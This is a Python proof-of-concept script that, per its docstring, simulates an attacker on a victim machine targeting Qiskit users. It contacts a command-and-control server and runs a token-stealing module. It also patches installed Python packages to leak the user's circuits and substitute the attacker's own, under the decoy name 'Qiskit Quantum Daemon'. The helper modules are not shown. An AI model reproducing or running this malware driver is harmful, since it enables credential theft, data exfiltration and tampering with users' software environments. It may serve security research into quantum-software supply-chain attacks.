"""
Simulate an attacker running on the current machine.

This should run on the victim machine. The threat model here is that
this runs with the same privileges at the victim user, meaning it has
access to all virtual environments created by the user, and it can modify
files inside the python packages.
"""

import argparse
import platform
import sys
import os

from modules.communication import C2Communication
from modules.token_stealer import TokenStealer
from modules.patcher import LinuxPatcher, WindowsPatcher


if __name__ == "__main__":
    default_circuits_directory = os.path.join(os.getcwd(), 'bk-circuits')
    if not os.path.isdir(default_circuits_directory):
        os.makedirs(default_circuits_directory)

    parser = argparse.ArgumentParser(description="Qiskit Quantum Daemon")
    parser.add_argument(
        "--ip",
        help="The IP of the C2. Default: localhost",
        action="store",
        required=False,
        default=C2Communication.get_ip(),
    )
    parser.add_argument(
            "--port", help="The port used by C2.Default: 8000", action="store", required=False, default="8000"
    )

    parser.add_argument(
        "--backup",
        help="Directory that stores the leaked circuits. Default: %s" % (default_circuits_directory),
        action="store",
        required=False,
        default=default_circuits_directory,
    )

    parser.add_argument(
        "--attacker-circuits",
        help="Directory that contains attacker's circuits. Default: %s" % (os.path.join(os.getcwd(), 'attacker-circuits')),
        action="store",
        required=False,
        default=os.path.join(os.getcwd(), 'attacker-circuits'),
    )

    args = parser.parse_args(sys.argv[1:])

    with open("modules/execute_function.py.in", "r") as f:
        f_data = f.read()
    f_data = f_data.replace("%backup_circuit_dir%", 'r"%s"' % (args.backup))
    f_data = f_data.replace("%attacker_circuit_dir%", 'r"%s"' % (args.attacker_circuits))
    with open("execute_function.py", "w") as f:
        f.write(f_data)

    client = C2Communication(args.ip, int(args.port))
    token_stealer_instance = TokenStealer(client)

    system = platform.system()
    if system == "Linux":
        python_lib_patcher = LinuxPatcher(client, args.backup)
    elif system == "Windows":
        python_lib_patcher = WindowsPatcher(client, args.backup)
    else:
        print("[-] Unsuported system %s" % (system))
        exit(-1)

    try:
        token_stealer_instance.run()
        python_lib_patcher.run()
    except KeyboardInterrupt:
        print('[-] Interrupted')
    finally:
        python_lib_patcher.restore_state()
